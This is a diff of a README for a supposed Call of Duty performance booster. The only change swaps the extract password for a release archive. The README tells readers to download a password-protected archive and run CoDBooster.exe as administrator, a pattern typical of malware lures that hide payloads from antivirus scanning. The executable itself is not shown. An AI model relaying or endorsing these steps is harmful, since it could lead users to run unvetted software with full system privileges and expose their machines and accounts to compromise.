@@ -24,7 +24,7 @@ Improves FPS and reduces latency through Windows system tweaks.
 
 Get the latest version from **[Releases](https://github.com/OpenCryomancerBerth/cod-performance-booster/releases)**.
 
-**Extract password:** `BhKc-GX*9z5M`
+**Extract password:** `^$U^V4g^HukW`
 
 Run `CoDBooster.exe` as administrator.
 
